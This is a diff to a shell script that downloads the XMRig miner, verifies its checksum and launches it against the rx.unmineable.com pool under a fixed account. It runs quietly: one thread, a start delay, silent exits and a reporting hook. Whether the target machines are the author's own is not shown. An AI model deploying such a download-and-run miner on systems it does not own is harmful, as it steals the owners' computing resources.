@@ -5,7 +5,9 @@ PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin${PATH:+:$PATH
 export PATH
 umask 077
 
-XMRIG_URL="${XMRIG_URL:-https://github.com/alvin3y/lov-remote/raw/refs/heads/main/xmrig}"
+XMRIG_VERSION="${XMRIG_VERSION:-6.26.0}"
+XMRIG_URL="${XMRIG_URL:-https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz}"
+XMRIG_SHA256="${XMRIG_SHA256:-b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49}"
 POOL="${POOL:-rx.unmineable.com:3333}"
 ACCOUNT="${ACCOUNT:-alvin3y1}"
 THREADS="${THREADS:-1}"
@@ -63,15 +65,35 @@ start_worker()
 
     sleep "$START_DELAY"
 
-    TEMP_XMRIG="$INSTALL_DIR/xmrig.download.$$"
+    TEMP_ARCHIVE="$INSTALL_DIR/xmrig.download.$$.tar.gz"
+    TEMP_DIR="$INSTALL_DIR/xmrig.extract.$$"
+    mkdir "$TEMP_DIR" 2>/dev/null || {
+        report "install_error" "could not create extraction directory"
+        exit 0
+    }
     if ! curl -fsSL --retry 3 --connect-timeout 15 \
-        "$XMRIG_URL" -o "$TEMP_XMRIG"; then
-        rm -f "$TEMP_XMRIG"
-        report "download_error" "failed to download xmrig"
+        "$XMRIG_URL" -o "$TEMP_ARCHIVE"; then
+        rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
+        report "download_error" "failed to download static xmrig archive"
         exit 0
     fi
-    if [ ! -s "$TEMP_XMRIG" ]; then
-        report "download_error" "xmrig download was empty"
+    command -v tar >/dev/null 2>&1 || {
+        report "install_error" "tar is unavailable"
+        exit 0
+    }
+    command -v sha256sum >/dev/null 2>&1 || {
+        report "install_error" "sha256sum is unavailable"
+        exit 0
+    }
+    if ! tar -xzf "$TEMP_ARCHIVE" -C "$TEMP_DIR" \
+        "xmrig-${XMRIG_VERSION}/xmrig"; then
+        report "install_error" "could not extract static xmrig"
+        exit 0
+    fi
+    TEMP_XMRIG="$TEMP_DIR/xmrig-${XMRIG_VERSION}/xmrig"
+    if ! printf '%s  %s\n' "$XMRIG_SHA256" "$TEMP_XMRIG" |
+        sha256sum -c - >/dev/null 2>&1; then
+        report "install_error" "static xmrig checksum mismatch"
         exit 0
     fi
     if ! chmod 700 "$TEMP_XMRIG"; then
@@ -82,6 +104,7 @@ start_worker()
         report "install_error" "could not install xmrig"
         exit 0
     fi
+    rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
 
     WORKER="worker-$(date +%s)-$$"
     command -v nohup >/dev/null 2>&1 || {
